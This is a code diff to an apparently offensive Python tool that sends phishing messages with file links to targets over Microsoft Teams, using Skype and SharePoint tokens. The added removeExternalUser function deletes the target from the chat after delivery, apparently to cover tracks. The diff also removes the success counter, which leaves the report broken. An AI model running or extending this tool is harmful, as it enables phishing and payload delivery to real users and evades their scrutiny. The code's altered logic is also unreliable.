@@ -12,6 +12,7 @@ import datetime
 from os.path import expanduser
 import hashlib
 
+
 ## Global Options and Variables ##
 # Greeting: The greeting to use in messages sent to targets. Will be joined with the targets name if the --personalize flag is used
 # Examples: "Hi" "Good Morning" "Greetings"
@@ -360,6 +361,8 @@ def uploadFile(sharepointToken, senderSharepointURL, senderDrive, attachment):
 
     return uploadInfo
 
+
+
 def createThread(skypeToken, senderInfo, targetInfo):
 
     headers = {
@@ -385,6 +388,32 @@ def createThread(skypeToken, senderInfo, targetInfo):
     threadID = content.headers.get('Location').split("/")[-1]
 
     return threadID
+
+def removeExternalUser(skypeToken, senderInfo, threadID, targetInfo):
+    headers = {
+        "Authentication": "skypetoken=" + skypeToken,
+        "User-Agent": useragent,
+        "Content-Type": "application/json",
+        "Origin": "https://teams.microsoft.com",
+        "Referer": "https://teams.microsoft.com/"
+    }
+
+    # Get the current thread information
+    response = requests.get(f"https://amer.ng.msg.teams.microsoft.com/v1/threads/{threadID}", headers=headers)
+    if response.status_code != 200:
+        p_warn("Error retrieving thread information: %d" % (response.status_code))
+        return None
+
+    thread = response.json()
+
+    # Delete the target user from the thread
+    content = requests.delete(f"https://amer.ng.msg.teams.microsoft.com/v1/threads/{threadID}/members/{targetInfo.get('mri')}", headers=headers)
+    print(content.text)
+    if content.status_code != 204:
+        p_warn("Error removing user: %d" % (content.status_code))
+        p_warn(content.text)
+        return None
+
 
 def sendFile(skypeToken, threadID, senderInfo, targetInfo, inviteInfo, senderSharepointURL, senderDrive, attachment, message, personalize, nogreeting):
 
@@ -529,6 +558,10 @@ def getInviteLink(sharepointToken, senderSharepointURL, senderDrive, senderInfo,
     inviteInfo = json.loads(content.text)
 
     return inviteInfo
+
+
+
+
 
 
 banner = """
@@ -760,16 +793,15 @@ if __name__ == "__main__":
 
                 # Create new chat thread with target user
                 threadID = createThread(skypeToken, senderInfo, targetInfo)
-                if threadID:
+                
 
+                if threadID:
                     # Retrieve an invite link for the uploaded file
                     inviteInfo = getInviteLink(sharepointToken, senderSharepointURL, senderDrive, senderInfo, targetInfo, uploadInfo.get('sharepointIds').get('listItemUniqueId'), args.securelink)
-                    if(inviteInfo):
-
+                    if inviteInfo:
                         # Send attacker-defined message to target with file sharing URL    
                         success = sendFile(skypeToken, threadID, senderInfo, targetInfo, inviteInfo, senderSharepointURL, senderDrive, args.attachment, args.message, args.personalize, args.nogreeting)
-                        if success:
-                            numSent += 1
+                        removeExternalUser(skypeToken, senderInfo, threadID, targetInfo)
                     else:
                         numFailed += 1
                         continue
@@ -779,8 +811,7 @@ if __name__ == "__main__":
         
         else:
             numFailed += 1
-            
-    # Print report
+# Print report
     if not args.preview:
         p_info("\nReport:\n")
         p_task("Successes")
@@ -790,3 +821,4 @@ if __name__ == "__main__":
             p_err(str(numFailed), False)
         p_task("Total")
         p_info("[~] " + str(numTargets))
+        p_info("\n")
